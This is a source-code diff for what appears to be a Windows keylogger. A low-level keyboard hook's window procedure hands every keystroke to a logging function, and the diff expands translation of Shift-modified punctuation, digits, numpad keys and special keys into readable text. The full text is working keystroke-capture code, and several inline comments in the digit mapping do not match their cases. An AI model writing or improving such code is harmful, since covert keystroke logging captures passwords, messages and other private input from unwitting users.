@@ -62,13 +62,13 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 				treatKey("[CAPSLOCK]", p->vkCode);
 			}
 			else if (p->vkCode == VK_RETURN) {
-				treatKey("\n", p->vkCode);
+				treatKey("[ENTER]\n", p->vkCode);
 			}
 			else if (p->vkCode == VK_TAB) {
 				treatKey("[TAB]", p->vkCode);
 			}
 			else if (p->vkCode == VK_SPACE) {
-				treatKey("\x20", p->vkCode);
+				treatKey("[SPACE]\x20", p->vkCode);
 			}
 			else if (p->vkCode == VK_CONTROL || p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL) {
 				treatKey("[CTRL]", p->vkCode);
@@ -93,6 +93,12 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 			}
 			else if (p->vkCode == VK_DOWN) {
 				treatKey("[DOWN]", p->vkCode);
+			}
+			else if (p->vkCode == VK_DELETE) {
+				treatKey("[DELETE]", p->vkCode);
+			}
+			else if (p->vkCode == VK_INSERT) {
+				treatKey("[INSERT]", p->vkCode);
 			}
 			else if (p->vkCode == VK_F1) {
 				treatKey("[F1]", p->vkCode);
@@ -142,15 +148,171 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 			else if (p->vkCode == VK_NUMLOCK) {
 				treatKey("[NUMLOCK]", p->vkCode);
 			}
-			else if (p->vkCode == 190 || p->vkCode == 110) {
-				treatKey(".", p->vkCode);
+			else if (p->vkCode == 106) {
+				treatKey("*", p->vkCode);
+			}
+			else if (p->vkCode == 186) {
+				if (nKey) {
+					treatKey(":", p->vkCode);
+					nKey = 0;
+				}
+				else if (!nKey)
+					treatKey(";", p->vkCode);
+			}
+			else if (p->vkCode == 187 || p->vkCode == 107) {
+				if (nKey) {
+					treatKey("+", p->vkCode);
+					nKey = 0;
+				}
+				else if (!nKey)
+					treatKey("=", p->vkCode);
+			}
+			else if (p->vkCode == 188) {
+				if (nKey) {
+					treatKey("<", p->vkCode);
+					nKey = 0;
+				}
+				else if (!nKey)
+					treatKey(",", p->vkCode);
 			}
 			else if (p->vkCode == 189 || p->vkCode == 109) {
-				treatKey("-", p->vkCode);
+				if (nKey) {
+					treatKey("_", p->vkCode);
+					nKey = 0;
+				}
+				else if (!nKey)
+					treatKey("-", p->vkCode);
 			}
+			else if (p->vkCode == 190 || p->vkCode == 110) {
+				if (nKey) {
+					treatKey(">", p->vkCode);
+					nKey = 0;
+				}
+				else if (!nKey)
+					treatKey(".", p->vkCode);
+			}
+			else if (p->vkCode == 191 || p->vkCode == 111) {
+				if (nKey) {
+					treatKey("?", p->vkCode);
+					nKey = 0;
+				}
+				else if (!nKey)
+					treatKey("/", p->vkCode);
+			}
+			else if (p->vkCode == 192) {
+				if (nKey) {
+					treatKey("~", p->vkCode);
+					nKey = 0;
+				}
+				else if (!nKey)
+					treatKey("`", p->vkCode);
+			}
+			else if (p->vkCode == 219) {
+				if (nKey) {
+					treatKey("{", p->vkCode);
+					nKey = 0;
+				}
+				else if (!nKey)
+					treatKey("[", p->vkCode);
+			}
+			else if (p->vkCode == 221) {
+				if (nKey) {
+					treatKey("}", p->vkCode);
+					nKey = 0;
+				}
+				else if (!nKey)
+					treatKey("]", p->vkCode);
+			}
+			else if (p->vkCode == 222) {
+				if (nKey) {
+					treatKey("\"", p->vkCode);
+					nKey = 0;
+				}
+				else if (!nKey)
+					treatKey("'", p->vkCode);
+				}
+			else if (p->vkCode == 226) {
+				if (nKey) {
+					treatKey("|", p->vkCode);
+					nKey = 0;
+				}
+				else if (!nKey)
+					treatKey("\\", p->vkCode);
+					}
 			else {
 				charPressed = (char)p->vkCode;
 				if (charPressed > 0) {
+					if (charPressed >= 48 && charPressed <= 57) {
+						if (nKey) {
+							switch (charPressed) {
+							case 48:
+								charPressed = 41;	// 1 -> !
+								break;
+							case 49:
+								charPressed = 33;	// 2 -> @
+								break;
+							case 50:
+								charPressed = 64;	// 3 -> #
+								break;
+							case 51:
+								charPressed = 35;	// 4 -> $
+								break;
+							case 52:
+								charPressed = 36;	// 5 -> %
+								break;
+							case 53:
+								charPressed = 37;	// 6 -> ^
+								break;
+							case 54:
+								charPressed = 94;	// 7 -> &
+								break;
+							case 55:
+								charPressed = 38;	// 8 -> *
+								break;
+							case 56:
+								charPressed = 42;	// 9 -> (
+								break;
+							case 57:
+								charPressed = 40;	// 0 -> )
+								break;
+							}
+							nKey = 0;
+						}
+					}
+					if (charPressed >= 96 && charPressed <= 105) {	//키보드 숫자패드의 0~9 처리
+						switch (charPressed) {
+						case 96:
+							charPressed = 48;
+							break;
+						case 97:
+							charPressed = 49;
+							break;
+						case 98:
+							charPressed = 50;
+							break;
+						case 99:
+							charPressed = 51;
+							break;
+						case 100:
+							charPressed = 52;
+							break;
+						case 101:
+							charPressed = 53;
+							break;
+						case 102:
+							charPressed = 54;
+							break;
+						case 103:
+							charPressed = 55;
+							break;
+						case 104:
+							charPressed = 56;
+							break;
+						case 105:
+							charPressed = 57;
+							break;
+						}
+					}
 					if (!nKey && !GetKeyState(VK_CAPITAL)) {
 						charPressed = tolower(charPressed);
 					}
@@ -161,14 +323,14 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 					treatKey(string(1, charPressed), p->vkCode);
 				}
 			}
-		}
-		return 0;
+			return 0;
 
 		case WM_DESTROY:
 			HookStop();
 			return 0;
 		}
 		return DefWindowProc(hWnd, iMessage, wParam, lParam);
+	}
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance
